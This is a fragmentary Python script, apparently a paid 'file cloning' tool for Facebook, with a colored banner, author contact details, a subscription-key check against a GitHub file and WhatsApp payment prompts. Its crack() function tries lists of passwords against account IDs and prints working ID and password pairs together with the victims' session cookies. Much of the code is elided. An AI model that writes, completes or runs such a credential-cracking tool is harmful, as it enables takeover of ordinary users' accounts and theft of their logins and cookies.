...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mRABBI')
...
#    username = input(' \033[0;92mEnter Username: ')
 ...
 #   if username == 'RABBI' and password == 'JANNAT':
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mMD RABBI HASSAN]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • Md Rabbi Hassan   ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38mRabbi-Hassan-007]   ║\33[1;34m   
╠══[Whatsapp                 • 01641763215 ]  ║\33[1;35m 
╠══[TOOLS                    • Paid  ]        ║ \33[1;32m   
╠══[VERSION                  • 3.6 ]          ║\033[1;35m 
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m""")
def login():
	banner()
	RABBI('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	RABBI('\033[0;97m===============================================')
	RABBI= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if RABBI in ['m']:
		public()
	elif RABBI in ['1']:
		crack_file()
		...
		os.system('xdg-open https://wa.me/+8801641763215')
	elif RABBI in ['0']:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[RABBI-XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#RABBI-King
				#print(f'\r\033[0;94m[{time.strftime("%H:%M")}•RABBI-Cp] {idf} • {pw}')     
				...
				#RABBI-King
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•RABBI-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
...
def Subscraption():
	r1=requests.get("https://github.com/rabbihassan007/Public-CloNing-42o/blob/main/Approval.txt").text
	if key1 in r1:
		os.system('clear')
		login()
	else:
		...
		time.sleep(0.0010)
		print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m RABBI King, ToOLs Daily Update")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 7 DAYS 300 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 15 DAYS 500 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key  :\033[0;93m "+ak+RABBI+key1)
		...
		time.sleep(3.5)
		tks = 'Assalamu%20Alaikum-!💚,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+RABBI+''+key1
		os.system('am start https://wa.me/+8801641763215?text=' + tks)
		Subscraption() 
